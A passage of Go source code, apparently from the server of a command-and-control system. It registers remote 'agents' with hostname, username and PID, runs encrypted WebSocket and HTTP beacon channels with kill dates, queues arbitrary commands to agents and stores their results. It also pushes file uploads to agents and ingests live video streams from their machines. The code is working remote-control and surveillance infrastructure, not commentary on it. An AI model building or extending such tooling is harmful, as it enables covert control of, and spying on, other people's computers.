	if agentPubB64 := asString(reg["ecdhe_pub"]); agentPubB64 != "" {
		if agentPub, e := ecdhePubFromB64(agentPubB64); e == nil {
			if srvPriv, e := ecdheNewPrivate(); e == nil {
				if key, e := ecdheDerive(srvPriv, agentPub); e == nil {
					sessionKey = key
					serverPubB64 = ecdhePubB64(srvPriv)
				}
			}
		}
	}

	reply := registerReply(agent.ID, true)
	if serverPubB64 != "" {
		reply["ecdhe_pub"] = serverPubB64
		reply["crypto"] = true
		reply["crypto_alg"] = "x25519-hkdf-sha256+aes-256-gcm"
	}

	agent.mu.Lock()
	_ = wsWriteMsg(conn, reply) // still PSK-sealed: connKey not yet set
	agent.mu.Unlock()

	// Switch to the session key for all traffic after the register reply.
	if sessionKey != nil {
		setConnKey(conn, sessionKey)
		logPrintf("ECDH session key established id=%s (%d bytes)", agent.ID, len(sessionKey))
	}

	flushJobsToWS(agent)

	for {
		// Deadline is refreshed on every data message (heartbeat/stream_frame)
		// and on every pong (see SetPongHandler above), so a healthy client is
		// never dropped for idle; only a truly dead peer times out.
		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
		_, raw, err := conn.ReadMessage()
		if err != nil {
			logPrintf("WS read fail id=%s: %v", agent.ID, err)
			break
		}
		// Binary stream frame fast path. NB: dispatch is on the 0xB1 magic
		// byte, NOT the WS message type — legacy clients already send sealed
		// JSON text as binary opcodes, so mt alone cannot distinguish.
		if len(raw) > 1 && raw[0] == binStreamMagic {
			key := getConnKey(conn)
			if key == nil {
				key = cfg.CryptoKey
			}
			pt, derr := aeadOpenRaw(key, raw[1:])
			if derr != nil {
				// one bad frame must not kill the seat connection
				logPrintf("binstream decrypt fail id=%s: %v", agent.ID, derr)
				continue
			}
			applyStreamFrameBinary(agent.ID, pt)
			continue
		}
		key := getConnKey(conn)
		if key == nil {
			key = cfg.CryptoKey
		}
		msg, derr := decodeAgentBodyKey(key, raw)
		if derr != nil {
			logPrintf("WS read fail id=%s: %v", agent.ID, derr)
			break
		}
		handleAgentMessage(agent, msg)
		// opportunistic flush on heartbeat
		if asString(msg["type"]) == "heartbeat" {
			flushJobsToWS(agent)
			agent.mu.Lock()
			_ = wsWriteMsg(conn, map[string]interface{}{
				"type":      "pong",
				"timestamp": time.Now().Unix(),
				"kill_date": killDateUnix(),
			})
			agent.mu.Unlock()
		}
	}

	setConnKey(conn, nil)

	agentsMu.Lock()
	if a := agents[agent.ID]; a != nil && a.conn == conn {
		a.Online = false
		a.conn = nil
		a.LastSeen = time.Now().UTC()
	}
	agentsMu.Unlock()
	schedulePersist()
}

func registerReply(agentID string, queuedFlush bool) map[string]interface{} {
	m := map[string]interface{}{
		"type":            "registered",
		"agent_id":        agentID,
		"server_time":     time.Now().Unix(),
		"kill_date":       killDateUnix(),
		"max_age_sec":     maxAgeSec(),
		"cmd_timeout_sec": cfg.CmdTimeoutSec,
		"server_ver":      serverVersion,
		"queued_flush":    queuedFlush,
		"file_max_bytes":  cfg.FileMaxBytes,
		"file_chunk":      cfg.FileChunkBytes,
		"transports":      []string{"wss", "http"},
		"crypto":          cfg.CryptoOn,
		"crypto_alg":      "",
		"bin_stream":      true, // server accepts 0xB1 binary stream frames on agent WS
	}
	if cfg.CryptoOn {
		m["crypto_alg"] = "aes-256-gcm"
	}
	return m
}

func upsertAgentFromRegister(reg map[string]interface{}, transport, remote string, conn *websocket.Conn) (*Agent, error) {
	id := firstNonEmpty(asString(reg["agent_id"]), asString(reg["stable_id"]))
	if id == "" {
		return nil, fmt.Errorf("agent_id required")
	}
	now := time.Now().UTC()
	agentsMu.Lock()
	defer agentsMu.Unlock()

	a, ok := agents[id]
	if !ok {
		a = &Agent{
			ID:        id,
			StableID:  id,
			FirstSeen: now,
		}
		agents[id] = a
	}
	// steal session
	if a.conn != nil && a.conn != conn && conn != nil {
		_ = a.conn.Close()
	}
	a.StableID = id
	a.Hostname = asString(reg["hostname"])
	a.Username = asString(reg["username"])
	a.OS = asString(reg["os"])
	a.Arch = asString(reg["arch"])
	a.PID = asInt(reg["pid"])
	a.Version = asString(reg["version"])
	a.Transport = transport
	a.RemoteAddr = remote
	a.LastSeen = now
	a.Online = true
	if conn != nil {
		a.conn = conn
	} else {
		// http beacon: leave conn nil but online until soft timeout
		a.conn = nil
	}
	schedulePersist()
	return a, nil
}

func applyGamePresence(a *Agent, msg map[string]interface{}) {
	if a == nil || msg == nil {
		return
	}
	// Only update when heartbeat carries the field (bool present)
	if v, ok := msg["game_active"].(bool); ok {
		a.GameActive = v
		a.StreamEnable = v
		if v {
			a.DashboardLED = "green"
		} else {
			a.DashboardLED = "gray"
			a.GameID = ""
			a.GameTitle = ""
			a.GamePID = 0
			a.GameSince = 0
		}
	}
	if s := asString(msg["dashboard_led"]); s != "" {
		a.DashboardLED = s
	}
	if s := asString(msg["game_id"]); s != "" {
		a.GameID = s
	}
	if s := asString(msg["game_title"]); s != "" {
		a.GameTitle = s
	}
	if n := asInt(msg["game_pid"]); n > 0 {
		a.GamePID = n
	}
	if n, ok := asInt64(msg["game_since"]); ok && n > 0 {
		a.GameSince = n
	}
	if v, ok := msg["stream_enable"].(bool); ok {
		a.StreamEnable = v
	}
	if s := asString(msg["game_profile"]); s != "" {
		a.GameProfile = s
	}
	// default led when online but never reported
	if a.DashboardLED == "" {
		if a.GameActive {
			a.DashboardLED = "green"
		} else {
			a.DashboardLED = "gray"
		}
	}
}

func asInt64(v interface{}) (int64, bool) {
	switch t := v.(type) {
	case float64:
		return int64(t), true
	case int:
		return int64(t), true
	case int64:
		return t, true
	case json.Number:
		n, err := t.Int64()
		return n, err == nil
	default:
		return 0, false
	}
}

func handleAgentMessage(agent *Agent, msg map[string]interface{}) {
	agentsMu.Lock()
	if a := agents[agent.ID]; a != nil {
		a.LastSeen = time.Now().UTC()
		a.Online = true
		if asString(msg["type"]) == "heartbeat" || asString(msg["type"]) == "register" {
			applyGamePresence(a, msg)
		}
	}
	agentsMu.Unlock()

	switch asString(msg["type"]) {
	case "result":
		applyResult(msg)
	case "stream_frame":
		applyStreamFrame(agent.ID, msg)
	case "heartbeat", "pong", "register":
		// last seen + game presence applied above
	default:
		// ignore
	}
}

func applyStreamFrame(agentID string, msg map[string]interface{}) {
	var payload string
	// frame may be nested under "data" (agent pushes envelope in data) or flat fields
	if v, ok := msg["data"].(string); ok {
		payload = v
	}
	if payload == "" {
		return
	}
	var env struct {
		Type    string `json:"type"`
		AgentID string `json:"agent_id"`
		Frame   uint64 `json:"frame"`
		Stream  int64  `json:"stream"`
		SegType string `json:"seg_type"`
		Seq     int64  `json:"seq"`
		Size    int    `json:"size"`
		MIME    string `json:"mime"`
		Codec   string `json:"codec"`
		SHA256  string `json:"sha256"`
		DataB64 string `json:"data_b64"`
	}
	if err := json.Unmarshal([]byte(payload), &env); err != nil {
		return
	}
	if env.DataB64 == "" {
		return
	}
	now := time.Now().UTC()
	if env.SegType == "init" || env.SegType == "media" {
		// H264 path: decode base64 once at ingress; storage is Raw.
		rawSeg, derr := base64.StdEncoding.DecodeString(env.DataB64)
		if derr != nil {
			return
		}
		streamMu.Lock()
		defer streamMu.Unlock()
		if env.SegType == "init" {
			// 새 스트림 세대 시작 → media ring 초기화
			streamInit[agentID] = &StreamInit{
				AgentID:    agentID,
				Stream:     env.Stream,
				MIME:       env.MIME,
				Codec:      env.Codec,
				Size:       env.Size,
				Raw:        rawSeg,
				Params:     avcCParamSets(rawSeg),
				ReceivedAt: now,
			}
			streamSegs[agentID] = nil
			streamNotify(agentID) // init 도착 → 링 무시 대기자 재평가
			return
		}
		if init, ok := streamInit[agentID]; ok && init.Stream == env.Stream {
			segs := streamSegs[agentID]
			segs = append(segs, &StreamSeg{
				AgentID:    agentID,
				Stream:     env.Stream,
				Seq:        env.Seq,
				Size:       env.Size,
				MIME:       env.MIME,
				Raw:        rawSeg,
				ReceivedAt: now,
			})
			if len(segs) > streamSegMax {
				segs = segs[len(segs)-streamSegMax:]
			}
			streamSegs[agentID] = segs
			streamNotify(agentID) // 세그 도착 → 대기 롱폴 즉시 기상
		}
		return
	}
	streamMu.Lock()
	defer streamMu.Unlock()
	switch env.SegType {
	default:
		// legacy JPEG frame (seg_type 미지정)
		streamFrames[agentID] = &StreamFrame{
			AgentID:    agentID,
			Frame:      env.Frame,
			Size:       env.Size,
			MIME:       env.MIME,
			SHA256:     env.SHA256,
			DataB64:    env.DataB64,
			ReceivedAt: now,
		}
	}
}

// applyStreamFrameBinary stores one binary stream frame (see binStreamMagic).
// frame: kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payload
// kind: 1=init (payload=ftyp+moov), 2=media (payload=moof+mdat).
// Integrity comes from the GCM tag, so no per-frame sha256 is carried.
func applyStreamFrameBinary(agentID string, frame []byte) {
	if len(frame) < 18 {
		return
	}
	kind := frame[0]
	stream := int64(binary.LittleEndian.Uint64(frame[1:9]))
	seq := int64(binary.LittleEndian.Uint64(frame[9:17]))
	cl := int(frame[17])
	if len(frame) < 18+cl {
		return
	}
	codec := string(frame[18 : 18+cl])
	payload := frame[18+cl:]
	now := time.Now().UTC()
	streamMu.Lock()
	defer streamMu.Unlock()
	switch kind {
	case 1: // init: new stream generation resets the media ring
		streamInit[agentID] = &StreamInit{
			AgentID:    agentID,
			Stream:     stream,
			MIME:       "video/mp4",
			Codec:      codec,
			Size:       len(payload),
			Raw:        payload,
			Params:     avcCParamSets(payload),
			ReceivedAt: now,
		}
		streamSegs[agentID] = nil
		streamNotify(agentID) // init 도착 → 링 무시 대기자 재평가
	case 2: // media
		if init, ok := streamInit[agentID]; ok && init.Stream == stream {
			segs := append(streamSegs[agentID], &StreamSeg{
				AgentID:    agentID,
				Stream:     stream,
				Seq:        seq,
				Size:       len(payload),
				MIME:       "video/mp4",
				Raw:        payload,
				ReceivedAt: now,
			})
			if len(segs) > streamSegMax {
				segs = segs[len(segs)-streamSegMax:]
			}
			streamSegs[agentID] = segs
			streamNotify(agentID) // 세그 도착 → 대기 롱폴 즉시 기상
			go feedWebRTC(agentID, append([]byte(nil), payload...))
		}
	}
}

func applyResult(msg map[string]interface{}) {
	cmdID := asString(msg["command_id"])
	if cmdID == "" {
		return
	}
	jobsMu.Lock()
	defer jobsMu.Unlock()
	j, ok := jobs[cmdID]
	if !ok {
		return
	}
	if j.Status == "cancelled" {
		return
	}
	now := time.Now().UTC()
	j.UpdatedAt = now
	success, hasSuccess := msg["success"].(bool)
	if hasSuccess {
		j.Success = &success
		if success {
			j.Status = "done"
		} else {
			j.Status = "failed"
		}
	} else {
		j.Status = "done"
	}
	j.Result = asString(msg["data"])
	j.Error = asString(msg["error"])
	if v, ok := msg["timed_out"].(bool); ok {
		j.TimedOut = v
	}
	if v, ok := msg["exit_code"].(float64); ok {
		ec := int(v)
		j.ExitCode = &ec
	}
	// optional file meta in result envelope
	schedulePersist()
}

func flushJobsToWS(agent *Agent) {
	if agent == nil || agent.conn == nil {
		return
	}
	toSend := takeQueuedJobs(agent.ID, cfg.JobQueueMax)
	agent.mu.Lock()
	defer agent.mu.Unlock()
	for _, j := range toSend {
		frame := map[string]interface{}{
			"type":     "command",
			"id":       j.ID,
			"cmd_type": j.CmdType,
			"payload":  j.Payload,
		}
		if err := wsWriteMsg(agent.conn, frame); err != nil {
			// requeue
			requeueJob(j.ID)
			return
		}
		markJobSent(j.ID)
	}
}

func takeQueuedJobs(agentID string, limit int) []*Job {
	jobsMu.Lock()
	defer jobsMu.Unlock()
	var out []*Job
	for _, j := range jobs {
		if j.AgentID == agentID && j.Status == "queued" {
			out = append(out, j)
		}
	}
	// oldest first
	for i := 0; i < len(out); i++ {
		for k := i + 1; k < len(out); k++ {
			if out[k].CreatedAt.Before(out[i].CreatedAt) {
				out[i], out[k] = out[k], out[i]
			}
		}
	}
	if limit > 0 && len(out) > limit {
		out = out[:limit]
	}
	return out
}

func markJobSent(id string) {
	jobsMu.Lock()
	defer jobsMu.Unlock()
	if j, ok := jobs[id]; ok && j.Status == "queued" {
		j.Status = "sent"
		j.SentAt = time.Now().UTC()
		j.UpdatedAt = j.SentAt
		schedulePersist()
	}
}

func requeueJob(id string) {
	jobsMu.Lock()
	defer jobsMu.Unlock()
	if j, ok := jobs[id]; ok && j.Status == "sent" {
		j.Status = "queued"
		j.UpdatedAt = time.Now().UTC()
		schedulePersist()
	}
}

// ---------- HTTP beacon (B-H6) ----------

// Beacon request body reuses agent frame types: register | heartbeat | result
// Response: { type, agent_id?, commands:[], kill_date, server_ver, ... }

func handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !tokenOK(extractToken(r), cfg.AgentToken) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	if killDatePassed() {
		writeJSON(w, http.StatusGone, map[string]interface{}{
			"type":   "die",
			"reason": "kill_date",
		})
		return
	}
	defer r.Body.Close()
	rawIn, err := io.ReadAll(io.LimitReader(r.Body, 16<<20))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}
	msg, err := decodeAgentBody(rawIn)
	if err != nil {
		http.Error(w, "bad json/crypto: "+err.Error(), http.StatusBadRequest)
		return
	}

	typ := asString(msg["type"])
	switch typ {
	case "register":
		agent, err := upsertAgentFromRegister(msg, "http", r.RemoteAddr, nil)
		if err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		cmds := pullCommandsForBeacon(agent.ID)
		reply := registerReply(agent.ID, len(cmds) > 0)
		reply["type"] = "registered"
		reply["commands"] = cmds
		writeAgentJSON(w, 200, reply)

	case "heartbeat", "poll", "result":
		aid := firstNonEmpty(asString(msg["agent_id"]), asString(msg["stable_id"]))
		if aid == "" {
			http.Error(w, "agent_id required", 400)
			return
		}
		if typ == "result" {
			applyResult(msg)
		}
		agentsMu.Lock()
		a, ok := agents[aid]
		if !ok {
			// auto soft-register skeleton so jobs can still flow after restart
			a = &Agent{ID: aid, StableID: aid, FirstSeen: time.Now().UTC(), DashboardLED: "gray"}
			agents[aid] = a
		}
		a.LastSeen = time.Now().UTC()
		a.Online = true
		a.Transport = "http"
		a.RemoteAddr = r.RemoteAddr
		if typ == "heartbeat" || typ == "poll" {
			applyGamePresence(a, msg)
		}
		agentsMu.Unlock()

		cmds := pullCommandsForBeacon(aid)
		writeAgentJSON(w, 200, map[string]interface{}{
			"type":            "ok",
			"agent_id":        aid,
			"timestamp":       time.Now().Unix(),
			"kill_date":       killDateUnix(),
			"max_age_sec":     maxAgeSec(),
			"cmd_timeout_sec": cfg.CmdTimeoutSec,
			"server_ver":      serverVersion,
			"commands":        cmds,
			"file_max_bytes":  cfg.FileMaxBytes,
			"crypto":          cfg.CryptoOn,
		})
		schedulePersist()

	default:
		http.Error(w, "unknown type", 400)
	}
}

func pullCommandsForBeacon(agentID string) []map[string]interface{} {
	toSend := takeQueuedJobs(agentID, cfg.JobQueueMax)
	out := make([]map[string]interface{}, 0, len(toSend))
	for _, j := range toSend {
		out = append(out, map[string]interface{}{
			"type":     "command",
			"id":       j.ID,
			"cmd_type": j.CmdType,
			"payload":  j.Payload,
		})
		markJobSent(j.ID)
	}
	return out
}

// ---------- Admin ----------

func handleAdminAgents(w http.ResponseWriter, r *http.Request) {
	// soft-offline http agents idle > 3* default interval (90s)
	softOfflineHTTP(90 * time.Second)

	agentsMu.RLock()
	list := make([]*Agent, 0, len(agents))
	for _, a := range agents {
		// queue depth
		jobsMu.RLock()
		q := 0
		for _, j := range jobs {
			if j.AgentID == a.ID && j.Status == "queued" {
				q++
			}
		}
		jobsMu.RUnlock()
		cp := *a
		cp.QueuedJobs = q
		cp.conn = nil
		if cp.DashboardLED == "" {
			if cp.GameActive {
				cp.DashboardLED = "green"
			} else {
				cp.DashboardLED = "gray"
			}
		}
		list = append(list, &cp)
	}
	agentsMu.RUnlock()
	writeJSON(w, 200, map[string]interface{}{"agents": list, "count": len(list)})
}

// handleAdminStream returns the latest live frame (H264 fMP4 or legacy JPEG) for an agent.
// GET /admin/stream?agent_id=X  (optionally &wait_sec=N to block until available, &since_seq=N for H264)
func handleAdminStream(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", 405)
		return
	}
	agentID := r.URL.Query().Get("agent_id")
	if agentID == "" {
		http.Error(w, "agent_id required", 400)
		return
	}
	waitSec := 0
	if v := r.URL.Query().Get("wait_sec"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			waitSec = n
		}
	}
	sinceSeq := int64(-1)
	if v := r.URL.Query().Get("since_seq"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil {
			sinceSeq = n
		}
	}
	rawFmt := r.URL.Query().Get("format") == "raw"
	deadline := time.Now().Add(time.Duration(waitSec) * time.Second)
	start := time.Now() // v19: 롱폴 대기→서빙 지연 측정 기준
	for {
		streamMu.RLock()
		init := streamInit[agentID]
		var segs []*StreamSeg
		if init != nil {
			segs = append(segs, streamSegs[agentID]...)
		}
		jpeg := streamFrames[agentID]
		streamMu.RUnlock()

		if init != nil {
			// H264 mode: init + media segments with seq > sinceSeq
			out := make([]*StreamSeg, 0, len(segs))
			latest := int64(0)
			sum := 0
			for _, s := range segs {
				if s.Seq > latest {
					latest = s.Seq
				}
				if s.Seq > sinceSeq {
					out = append(out, s)
					sum += s.Size
				}
			}
			if rawFmt {
				if len(out) == 0 {
					// v19: 백로그 소진 후 신규 세그 없음 — 이벤트 대기로 홀드.
					// 즉시 빈 응답을 반복하면 브라우저 0ms 재요청 루프가 요청 폭풍이 되므로,
					// 세그 도착(wake)까지 무부하 대기하고 창 끝까지만 눕게 되면 204(재시작 백오프 신호).
					if waitSec <= 0 || time.Now().After(deadline) {
						w.WriteHeader(http.StatusNoContent)
						return
					}
					wc := wakeChan(agentID)
					select {
					case <-wc:
					case <-time.After(300 * time.Millisecond):
					}
					continue
				}
				// Binary long-poll response: concatenated records
				//   kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payloadLen(4,LE) || payload
				// No base64/JSON on the viewer leg (it crosses the internet).
				logPrintf("poll serve: %s segs=%d bytes~%d waited_ms=%d", agentID, len(out), sum, time.Since(start).Milliseconds())
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Header().Set("Cache-Control", "no-store")
				w.WriteHeader(200)
				writeStreamRawRecord(w, 1, init.Stream, 0, init.Codec, init.Raw)
				for _, s := range out {
					writeStreamRawRecord(w, 2, s.Stream, s.Seq, "", s.Raw)
				}
				return
			}
			writeJSON(w, 200, map[string]interface{}{
				"mode":       "h264",
				"agent_id":   agentID,
				"init":       streamInitJSON(init),
				"segments":   streamSegsJSON(out),
				"latest_seq": latest,
			})
			return
		}
		if jpeg != nil {
			writeJSON(w, 200, jpeg)
			return
		}
		if waitSec <= 0 || time.Now().After(deadline) {
			writeJSON(w, 404, map[string]interface{}{"error": "no stream frame yet", "agent_id": agentID})
			return
		}
		// v19: 이벤트 대기 — 세그 도착 시 즉시 깨어 재검사, 데이터 없으면 무부하 대기(sleep 폐지)
		wc := wakeChan(agentID)
		select {
		case <-wc:
		case <-time.After(300 * time.Millisecond):
		}
	}
}

// streamRawRecord appends one binary stream record to dst (see handleAdminStream rawFmt):
// kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payloadLen(4,LE) || payload
func streamRawRecord(dst []byte, kind byte, stream, seq int64, codec string, payload []byte) []byte {
	cl := len(codec)
	if cl > 255 {
		cl = 255
	}
	dst = append(dst, kind)
	var b8 [8]byte
	binary.LittleEndian.PutUint64(b8[:], uint64(stream))
	dst = append(dst, b8[:]...)
	binary.LittleEndian.PutUint64(b8[:], uint64(seq))
	dst = append(dst, b8[:]...)
	dst = append(dst, byte(cl))
	dst = append(dst, codec[:cl]...)
	var b4 [4]byte
	binary.LittleEndian.PutUint32(b4[:], uint32(len(payload)))
	dst = append(dst, b4[:]...)
	return append(dst, payload...)
}

// writeStreamRawRecord emits one binary stream record (see handleAdminStream rawFmt).
func writeStreamRawRecord(w http.ResponseWriter, kind byte, stream, seq int64, codec string, payload []byte) {
	buf := streamRawRecord(make([]byte, 0, 22+len(codec)+len(payload)), kind, stream, seq, codec, payload)
	_, _ = w.Write(buf)
}

// wakeChan returns the current wake channel for agent (lazy create).
func wakeChan(agentID string) chan struct{} {
	wakeMu.Lock()
	defer wakeMu.Unlock()
	c, ok := streamWake[agentID]
	if !ok {
		c = make(chan struct{})
		streamWake[agentID] = c
	}
	return c
}

// streamNotify broadcasts a wake to all pending long-polls for agent.
// wakeMu(streamMu 아님)를 쓴다 — 생산자가 streamMu 홀드 중 호출해도 교착 없음.
func streamNotify(agentID string) {
	wakeMu.Lock()
	defer wakeMu.Unlock()
	if c, ok := streamWake[agentID]; ok {
		close(c)
		streamWake[agentID] = make(chan struct{})
	}
}

// handleAdminWSStream is the browser-facing WebSocket push leg for the H264
// live stream: GET /admin/wsstream?agent_id=X&token=... (token in query because
// browsers cannot set WS handshake headers; see extractToken). Pushes the init
// record plus every new ring segment as binary frames in the same record wire
// format the HTTP raw leg emits, so handleH264Raw parses both unchanged.
func handleAdminWSStream(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", 405)
		return
	}
	agentID := r.URL.Query().Get("agent_id")
	if agentID == "" {
		http.Error(w, "agent_id required", 400)
		return
	}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logPrintf("wsstream upgrade: %v", err)
		return
	}
	defer conn.Close()

	const (
		writeWait  = 10 * time.Second
		pongWait   = 60 * time.Second
		pingPeriod = 30 * time.Second
	)
	_ = conn.SetReadDeadline(time.Now().Add(pongWait))
	conn.SetPongHandler(func(string) error {
		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
		return nil
	})
	pingDone := make(chan struct{})
	defer close(pingDone)
	var writeMu sync.Mutex
	writeLocked := func(fn func() error) error {
		writeMu.Lock()
		defer writeMu.Unlock()
		return fn()
	}
	go func() {
		t := time.NewTicker(pingPeriod)
		defer t.Stop()
		for {
			select {
			case <-t.C:
				_ = writeLocked(func() error {
					return conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait))
				})
			case <-pingDone:
				return
			}
		}
	}()

	// Read pump: drains close frames; a dead browser or proxy fails the
	// pong-wait read deadline and tears the connection down.
	dead := make(chan struct{})
	go func() {
		defer close(dead)
		for {
			if _, _, err := conn.ReadMessage(); err != nil {
				return
			}
		}
	}()

	writeRecord := func(kind byte, stream, seq int64, codec string, payload []byte) bool {
		buf := streamRawRecord(make([]byte, 0, 22+len(codec)+len(payload)), kind, stream, seq, codec, payload)
		err := writeLocked(func() error {
			_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
			return conn.WriteMessage(websocket.BinaryMessage, buf)
		})
		return err == nil
	}

	var (
		haveInit  bool
		curStream int64
		lastSeq   = int64(-1)
	)
	// Event-driven push: wake immediately on streamNotify (same channel long-polls use).
	// Fallback 1s timeout covers missed wakes or idle keepalive scans.
	for {
		wc := wakeChan(agentID)
		select {
		case <-dead:
			return
		case <-wc:
			// new init or media segment arrived
		case <-time.After(1 * time.Second):
			// periodic safety scan
		}
		streamMu.RLock()
		init := streamInit[agentID]
		var segs []*StreamSeg
		if init != nil {
			segs = append(segs, streamSegs[agentID]...)
		}
		streamMu.RUnlock()
		if init == nil {
			continue
		}
		if !haveInit || init.Stream != curStream {
			// First scan after connect (or a new stream generation): push the
			// init record immediately; the client trims the ring backlog.
			if !writeRecord(1, init.Stream, 0, init.Codec, init.Raw) {
				return
			}
			haveInit = true
			curStream = init.Stream
			lastSeq = -1
		}
		for _, s := range segs {
			if s.Seq <= lastSeq {
				continue
			}
			if !writeRecord(2, s.Stream, s.Seq, "", s.Raw) {
				return
			}
			lastSeq = s.Seq
		}
	}
}

// streamInitJSON/streamSegsJSON project Raw storage onto the legacy JSON wire
// shape (data_b64) so old admin clients keep working unchanged.
func streamInitJSON(s *StreamInit) map[string]interface{} {
	return map[string]interface{}{
		"agent_id":    s.AgentID,
		"stream":      s.Stream,
		"mime":        s.MIME,
		"codec":       s.Codec,
		"size":        s.Size,
		"data_b64":    base64.StdEncoding.EncodeToString(s.Raw),
		"received_at": s.ReceivedAt,
	}
}

func streamSegsJSON(segs []*StreamSeg) []map[string]interface{} {
	out := make([]map[string]interface{}, 0, len(segs))
	for _, s := range segs {
		out = append(out, map[string]interface{}{
			"agent_id":    s.AgentID,
			"stream":      s.Stream,
			"seq":         s.Seq,
			"size":        s.Size,
			"mime":        s.MIME,
			"data_b64":    base64.StdEncoding.EncodeToString(s.Raw),
			"received_at": s.ReceivedAt,
		})
	}
	return out
}

func softOfflineHTTP(idle time.Duration) {
	now := time.Now().UTC()
	agentsMu.Lock()
	defer agentsMu.Unlock()
	for _, a := range agents {
		if a.Transport == "http" && a.Online && now.Sub(a.LastSeen) > idle {
			a.Online = false
		}
		if a.Transport == "wss" && a.conn == nil {
			a.Online = false
		}
	}
}

func handleAdminCmd(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	var req struct {
		AgentID string `json:"agent_id"`
		CmdType string `json:"cmd_type"`
		Payload string `json:"payload"`
		ID      string `json:"id"`
		Force   bool   `json:"force"` // lab override: skip stream_enable gate
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad json", 400)
		return
	}
	if req.AgentID == "" || req.CmdType == "" {
		http.Error(w, "agent_id and cmd_type required", 400)
		return
	}
	job, status, err := enqueueAndMaybeSend(req.AgentID, req.CmdType, req.Payload, req.ID)
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
	writeJSON(w, 200, map[string]interface{}{
		"status":     status,
		"command_id": job.ID,
		"agent_id":   job.AgentID,
		"queued":     countQueued(req.AgentID),
	})
}

func countQueued(agentID string) int {
	jobsMu.RLock()
	defer jobsMu.RUnlock()
	n := 0
	for _, j := range jobs {
		if j.AgentID == agentID && j.Status == "queued" {
			n++
		}
	}
	return n
}

func enqueueAndMaybeSend(agentID, cmdType, payload, id string) (*Job, string, error) {
	if id == "" {
		id = newID("cmd")
	}
	// queue cap
	if countQueued(agentID) >= cfg.JobQueueMax {
		return nil, "", fmt.Errorf("queue full for agent")
	}
	now := time.Now().UTC()
	j := &Job{
		ID:        id,
		AgentID:   agentID,
		CmdType:   cmdType,
		Payload:   payload,
		Status:    "queued",
		CreatedAt: now,
		UpdatedAt: now,
	}
	jobsMu.Lock()
	jobs[id] = j
	jobsMu.Unlock()
	schedulePersist()

	// try immediate WS deliver
	agentsMu.RLock()
	a := agents[agentID]
	agentsMu.RUnlock()
	status := "queued"
	if a != nil && a.Online && a.conn != nil && a.Transport == "wss" {
		a.mu.Lock()
		frame := map[string]interface{}{
			"type": "command", "id": j.ID, "cmd_type": j.CmdType, "payload": j.Payload,
		}
		if err := wsWriteMsg(a.conn, frame); err == nil {
			markJobSent(j.ID)
			status = "sent"
		}
		a.mu.Unlock()
	}
	// http agents pick up on next beacon — stay queued until pull (mark sent on pull)
	return j, status, nil
}

func handleAdminJobs(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodDelete {
		handleAdminCancel(w, r)
		return
	}
	qAgent := r.URL.Query().Get("agent_id")
	qStatus := r.URL.Query().Get("status")
	limit := envInt("UNUSED", 200)
	if v := r.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			limit = n
		}
	}
	jobsMu.RLock()
	list := make([]*Job, 0, len(jobs))
	counts := map[string]int{"queued": 0, "sent": 0, "done": 0, "failed": 0, "cancelled": 0}
	for _, j := range jobs {
		counts[j.Status]++
		if qAgent != "" && j.AgentID != qAgent {
			continue
		}
		if qStatus != "" && j.Status != qStatus {
			continue
		}
		list = append(list, j)
	}
	jobsMu.RUnlock()
	// newest first
	for i := 0; i < len(list); i++ {
		for k := i + 1; k < len(list); k++ {
			if list[k].CreatedAt.After(list[i].CreatedAt) {
				list[i], list[k] = list[k], list[i]
			}
		}
	}
	if limit > 0 && len(list) > limit {
		list = list[:limit]
	}
	writeJSON(w, 200, map[string]interface{}{
		"jobs":   list,
		"counts": counts,
		"total":  len(list),
	})
}

func handleAdminCancel(w http.ResponseWriter, r *http.Request) {
	var commandID, agentID string
	if r.Method == http.MethodDelete {
		commandID = r.URL.Query().Get("command_id")
		agentID = r.URL.Query().Get("agent_id")
	} else {
		var req struct {
			CommandID string `json:"command_id"`
			AgentID   string `json:"agent_id"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		commandID, agentID = req.CommandID, req.AgentID
	}
	if commandID == "" {
		http.Error(w, "command_id required", 400)
		return
	}
	jobsMu.Lock()
	j, ok := jobs[commandID]
	if !ok {
		jobsMu.Unlock()
		http.Error(w, "not found", 404)
		return
	}
	if agentID != "" && j.AgentID != agentID {
		jobsMu.Unlock()
		http.Error(w, "agent mismatch", 400)
		return
	}
	switch j.Status {
	case "queued", "sent":
		j.Status = "cancelled"
		j.UpdatedAt = time.Now().UTC()
		jobsMu.Unlock()
		schedulePersist()
		writeJSON(w, 200, map[string]interface{}{"status": "cancelled", "command_id": commandID})
	default:
		st := j.Status
		jobsMu.Unlock()
		writeJSON(w, 200, map[string]interface{}{
			"status": st, "command_id": commandID,
			"error": "already terminal",
		})
	}
}

// POST /admin/upload  {agent_id, path, data_b64}  OR {agent_id, path, local_server_path}
// Enqueues one or more upload chunk commands.
func handleAdminUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	var req struct {
		AgentID   string `json:"agent_id"`
		Path      string `json:"path"`
		DataB64   string `json:"data_b64"`
